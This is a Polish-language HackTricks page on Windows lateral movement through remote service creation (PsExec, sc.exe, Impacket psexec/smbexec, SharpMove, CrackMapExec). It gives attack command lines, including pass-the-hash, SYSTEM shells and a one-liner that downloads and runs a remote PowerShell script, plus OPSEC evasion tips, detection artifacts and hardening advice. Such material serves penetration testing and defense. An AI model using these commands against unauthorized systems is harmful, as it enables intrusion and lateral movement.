# Zdalne wykonywanie usług (PsExec, WinExec, ScExec, SMBExec, SCMExec)

{{#include ../../banners/hacktricks-training.md}}

## Jak to działa

Te techniki nadużywają zdalnie Windows Service Control Manager (SCM) za pośrednictwem SMB/RPC, aby wykonywać polecenia na komputerze docelowym. Service Control Manager Remote Protocol (SCMR) to oparty na RPC interfejs służący do konfigurowania usług Windows i zarządzania nimi na zdalnym komputerze. Przy wystarczających uprawnieniach operator może utworzyć lub przekonfigurować usługę, której ścieżka pliku binarnego zawiera polecenie, a następnie uruchomić tę usługę, aby wykonać je zdalnie.<sup>[[5]](#references)</sup> Typowy przebieg wygląda następująco:

1. Uwierzytelnij się na komputerze docelowym przez SMB/RPC (TCP/445); uzyskaj dostęp do udziału ADMIN$, jeśli wybrany wariant wymaga umieszczenia tam pliku lub pobrania stamtąd wyników.
2. Skopiuj plik wykonywalny lub określ wiersz poleceń LOLBAS, który ma uruchomić usługa.
3. Zdalnie utwórz usługę za pośrednictwem SCM (MS-SCMR przez \PIPE\svcctl), wskazującą to polecenie lub plik binarny.
4. Uruchom usługę, aby wykonać payload, i opcjonalnie przechwyć stdin/stdout za pomocą nazwanej potoki.
5. Zatrzymaj usługę i posprzątaj po operacji (usuń usługę i wszelkie umieszczone pliki binarne).

Wymagania/prerekwizyty:
- Uprawnienia Local Administrator na komputerze docelowym (SeCreateServicePrivilege) lub jawne uprawnienia do tworzenia usług na tym komputerze.
- Dostępność SMB (445) oraz zezwolenie zapory hosta na Remote Service Management; udział ADMIN$ musi być dostępny w wariantach, które używają go do umieszczenia pliku lub pobrania wyników.
- UAC Remote Restrictions: w przypadku kont lokalnych filtrowanie tokenów może blokować uprawnienia administratora przez sieć, chyba że używane jest wbudowane konto Administrator lub ustawiono LocalAccountTokenFilterPolicy=1.
- Kerberos a NTLM: użycie nazwy hosta/FQDN umożliwia Kerberos; połączenie z użyciem adresu IP często powoduje przejście na NTLM (co może być blokowane w środowiskach o zaostrzonych zabezpieczeniach).

Jeśli nie określono konta usługi, `CreateService` używa `LocalSystem`, który ma rozległe uprawnienia lokalne. To wyjaśnia, dlaczego skuteczne wykonanie poleceń za pośrednictwem SCM ma duży wpływ. Nie wyłącza ono samo w sobie UAC ani Microsoft Defender: wywołujący nadal potrzebuje zdalnych uprawnień SCM, a mechanizmy ochrony punktów końcowych mogą sprawdzać usługę lub payload albo je blokować.<sup>[[7]](#references)</sup><sup>[[8]](#references)</sup>

### Ręczne użycie ScExec/WinExec przez sc.exe

Poniżej pokazano minimalny sposób tworzenia usługi. Obraz usługi może być zrzuconym plikiem EXE lub LOLBAS, takim jak cmd.exe albo powershell.exe.

```cmd
:: Execute a one-liner without dropping a binary
sc.exe \\TARGET create HTSvc binPath= "cmd.exe /c whoami > C:\\Windows\\Temp\\o.txt" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc

:: Drop a payload to ADMIN$ and execute it (example path)
copy payload.exe \\TARGET\ADMIN$\Temp\payload.exe
sc.exe \\TARGET create HTSvc binPath= "C:\\Windows\\Temp\\payload.exe" start= demand
sc.exe \\TARGET start HTSvc
sc.exe \\TARGET delete HTSvc
```

Notatki:
- Podczas uruchamiania pliku EXE, który nie jest usługą, może wystąpić błąd limitu czasu — wykonanie i tak nastąpi.
- Aby działać w sposób bardziej przyjazny dla OPSEC, preferuj polecenia bezplikowe (cmd /c, powershell -enc) lub usuwaj zrzucone artefakty.

Więcej szczegółowych kroków znajdziesz tutaj: https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/<sup>[[3]](#references)</sup>

## Narzędzia i przykłady

### Sysinternals PsExec.exe

- Klasyczne narzędzie administracyjne, które używa SMB do umieszczenia PSEXESVC.exe w ADMIN$, instaluje tymczasową usługę (domyślna nazwa: PSEXESVC) i przekazuje wejście/wyjście przez potoki nazwane.
- Przykładowe użycia:<sup>[[1]](#references)</sup>

```cmd
:: Interactive SYSTEM shell on remote host
PsExec64.exe -accepteula \\HOST -s -i cmd.exe

:: Run a command as a specific domain user
PsExec64.exe -accepteula \\HOST -u DOMAIN\user -p 'Passw0rd!' cmd.exe /c whoami /all

:: Customize the service name for OPSEC (-r)
PsExec64.exe -accepteula \\HOST -r WinSvc$ -s cmd.exe /c ipconfig
```

- Możesz uruchomić bezpośrednio z Sysinternals Live za pośrednictwem WebDAV:

```cmd
\\live.sysinternals.com\tools\PsExec64.exe -accepteula \\HOST -s cmd.exe /c whoami
```

OPSEC
- Pozostawia zdarzenia instalacji/odinstalowania usługi (nazwa usługi to często PSEXESVC, chyba że użyto -r) i podczas działania tworzy plik C:\Windows\PSEXESVC.exe.

### Impacket psexec.py (podobny do PsExec)

- Korzysta z osadzonej usługi przypominającej RemCom. Za pośrednictwem ADMIN$ umieszcza tymczasowy plik binarny usługi (zwykle o losowej nazwie), tworzy usługę (domyślnie często RemComSvc) i przekazuje wejście/wyjście przez nazwany potok.

```bash
# Password auth
psexec.py DOMAIN/user:Password@HOST cmd.exe

# Pass-the-Hash
psexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST cmd.exe

# Kerberos (use tickets in KRB5CCNAME)
psexec.py -k -no-pass -dc-ip 10.0.0.10 DOMAIN/user@host.domain.local cmd.exe

# Change service name and output encoding
psexec.py -service-name HTSvc -codec utf-8 DOMAIN/user:Password@HOST powershell -nop -w hidden -c "iwr http://10.10.10.1/a.ps1|iex"
```

W Kali przykłady Impacket mogą znajdować się w katalogu `/usr/share/doc/python3-impacket/examples/`. Jeśli nie podano hasła, narzędzie poprosi o jego podanie. Opcja `-k` w Impacket wymusza uwierzytelnianie Kerberos zamiast NTLM, zwykle z użyciem bieżącej pamięci podręcznej poświadczeń lub podanych poświadczeń.

```bash
#If no password is provided, it will be prompted
./psexec.py [[domain/]username[:password]@]<targetName or address>
./psexec.py -hashes <LM:NT> administrator@10.10.10.103 #Pass-the-Hash
psexec \\192.168.122.66 -u Administrator -p 123456Ww
psexec \\192.168.122.66 -u Administrator -p '<password>' # Sysinternals PsExec password authentication
```

Artefakty
- Tymczasowy plik EXE w C:\Windows\ (8 losowych znaków). Domyślna nazwa usługi to RemComSvc, chyba że zostanie nadpisana.

### Impacket smbexec.py (SMBExec)

- Tworzy tymczasową usługę, która uruchamia cmd.exe, i używa nazwanego potoku do obsługi wejścia/wyjścia. Zazwyczaj pozwala uniknąć zapisywania pełnego payloadu EXE; wykonywanie poleceń jest częściowo interaktywne.

```bash
smbexec.py DOMAIN/user:Password@HOST
smbexec.py -hashes LMHASH:NTHASH DOMAIN/user@HOST
```

### SharpLateral i SharpMove

- [SharpLateral](https://github.com/mertdas/SharpLateral) (C#) implementuje kilka metod ruchu bocznego, w tym wykonywanie oparte na usługach.

```cmd
SharpLateral.exe redexec HOSTNAME C:\\Users\\Administrator\\Desktop\\malware.exe.exe malware.exe ServiceName
```

- [SharpMove](https://github.com/0xthirteen/SharpMove) obsługuje uwierzytelnione zdalne wykonywanie za pośrednictwem SCM i kilku innych mechanizmów Windows, w tym modyfikowanie i tworzenie usług.

```cmd
SharpMove.exe action=modsvc computername=remote.host.local command="C:\windows\temp\payload.exe" amsi=true servicename=TestService
SharpMove.exe action=startservice computername=remote.host.local servicename=TestService
```

- Możesz też użyć CrackMapExec do uruchamiania poleceń za pośrednictwem różnych backendów (psexec/smbexec/wmiexec):

```bash
cme smb HOST -u USER -p PASS -x "whoami" --exec-method psexec
cme smb HOST -u USER -H NTHASH -x "ipconfig /all" --exec-method smbexec
```

#### SCMExec z SharpMove

Akcja SCM tworzy usługę o nazwie `WindowsDebug` i wskazuje ją na payload już obecny na zdalnym hoście.<sup>[[6]](#references)</sup>

```powershell
SharpMove.exe action=scm computername=remote.host.local command="C:\windows\temp\payload.exe" servicename=WindowsDebug amsi=true
```

## OPSEC, wykrywanie i artefakty

Typowe artefakty na hoście/w sieci podczas używania technik podobnych do PsExec:
- Zdarzenia Security 4624 (Logon Type 3) i 4672 (Special Privileges) na celu dla użytego konta administratora.
- Zdarzenia Security 5140/5145 File Share i File Share Detailed pokazujące dostęp do ADMIN$ oraz utworzenie/zapis plików binarnych usług (np. PSEXESVC.exe lub losowego pliku .exe o nazwie długości 8 znaków).
- Zdarzenie **System** 7045 z Service Control Manager dotyczące instalacji usługi na celu: nazwy takie jak PSEXESVC, RemComSvc lub niestandardowe (`-r` / `-service-name`). Potwierdza ono instalację usługi, ale nie to, że jej obraz został uruchomiony. Skoreluj sygnaturę czasową i ścieżkę obrazu ze zdarzeniami procesów lub pasującym wpisem prefetch obrazu usługi, jeśli jest dostępny.<sup>[[4]](#references)</sup>
- Sysmon 1 (Process Create) dla services.exe lub obrazu usługi, 3 (Network Connect), 11 (File Create) w C:\Windows\, 17/18 (Pipe Created/Connected) dla potoków takich jak \\.\pipe\psexesvc, \\.\pipe\remcom_* lub ich losowych odpowiedników.
- Artefakt rejestru dotyczący umowy EULA Sysinternals: HKCU\Software\Sysinternals\PsExec\EulaAccepted=0x1 na hoście operatora (jeśli nie pominięto tego kroku).

Pomysły na wyszukiwanie
- Generuj alerty dotyczące instalacji usług, których ImagePath zawiera cmd.exe /c, powershell.exe lub lokalizacje TEMP.
- Szukaj utworzenia procesów, w których ParentImage to C:\Windows\PSEXESVC.exe, albo procesów potomnych services.exe uruchomionych jako LOCAL SYSTEM i wykonujących powłoki.
- Oznaczaj nazwane potoki kończące się na -stdin/-stdout/-stderr lub zawierające dobrze znane nazwy potoków klonów PsExec.

## Rozwiązywanie typowych problemów
- Odmowa dostępu (5) podczas tworzenia usług: użytkownik nie ma faktycznie uprawnień administratora lokalnego, obowiązują ograniczenia UAC dla kont lokalnych albo EDR blokuje modyfikacje ścieżki pliku binarnego usługi.
- Nie znaleziono ścieżki sieciowej (53) lub nie można połączyć się z ADMIN$: zapora blokuje SMB/RPC albo udziały administracyjne są wyłączone.
- Kerberos nie działa, a NTLM jest zablokowany: połącz się, używając nazwy hosta/FQDN (nie adresu IP), upewnij się, że SPN są prawidłowe, albo użyj -k/-no-pass z biletami podczas korzystania z Impacket.
- Przekroczono limit czasu uruchamiania usługi, ale payload został uruchomiony: jest to oczekiwane, jeśli plik nie jest prawdziwym plikiem binarnym usługi; przechwyć wynik do pliku lub użyj smbexec do uzyskania bieżącego I/O.

## Uwagi dotyczące hardeningu
- Windows 11 24H2 i Windows Server 2025 domyślnie wymagają podpisywania SMB dla połączeń wychodzących (oraz przychodzących w Windows 11). Nie zakłóca to prawidłowego użycia PsExec z poprawnymi poświadczeniami, ale uniemożliwia nadużycia SMB relay bez podpisu i może wpływać na urządzenia, które nie obsługują podpisywania.<sup>[[2]](#references)</sup>
- Nowe blokowanie NTLM przez klienta SMB (Windows 11 24H2/Server 2025) może uniemożliwić użycie NTLM jako metody zapasowej podczas łączenia się przez adres IP lub z serwerami nieobsługującymi Kerberos. W zahartowanych środowiskach spowoduje to, że PsExec/SMBExec oparte na NTLM nie będą działać; używaj Kerberos (nazwa hosta/FQDN) lub skonfiguruj wyjątki, jeśli jest to uzasadnione.<sup>[[2]](#references)</sup>
- Zasada najmniejszych uprawnień: ogranicz członkostwo w grupie administratorów lokalnych, preferuj Just-in-Time/Just-Enough Admin, wymuszaj używanie LAPS oraz monitoruj i generuj alerty dotyczące instalacji usług 7045.

## Zobacz także

- Zdalne wykonywanie poleceń oparte na WMI (często niewymagające plików):

{{#ref}}
./wmiexec.md
{{#endref}}

- Zdalne wykonywanie poleceń oparte na WinRM:

{{#ref}}
./winrm.md
{{#endref}}

## References

- [1] [PsExec - Sysinternals | Microsoft Learn](https://learn.microsoft.com/sysinternals/downloads/psexec)
- [2] [Wzmacnianie zabezpieczeń SMB w Windows Server 2025 i Windows 11](https://techcommunity.microsoft.com/blog/filecab/smb-security-hardening-in-windows-server-2025--windows-11/4226591)
- [3] [Używanie poświadczeń do przejmowania kontroli nad komputerami z Windows — część 2 (PSExec i usługi)](https://blog.ropnop.com/using-credentials-to-own-windows-boxes-part-2-psexec-and-services/)
- [4] [Microsoft – Rozwiązywanie problemów z nieoczekiwanymi ponownymi uruchomieniami za pomocą dzienników zdarzeń systemowych](https://learn.microsoft.com/en-us/troubleshoot/windows-server/performance/troubleshoot-unexpected-reboots-system-event-logs)
- [5] [Microsoft Open Specifications - Omówienie protokołu zdalnego Service Control Manager](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-scmr/d5bd5712-fa64-44bf-9433-3651f6a5ce97)
- [6] [GitHub - SharpMove](https://github.com/0xthirteen/SharpMove)
- [7] [Microsoft Learn - Konto LocalSystem](https://learn.microsoft.com/en-us/windows/win32/services/localsystem-account)
- [8] [Microsoft Learn - Funkcja `CreateService`](https://learn.microsoft.com/en-us/windows/win32/api/winsvc/nf-winsvc-createservicea)
{{#include ../../banners/hacktricks-training.md}}
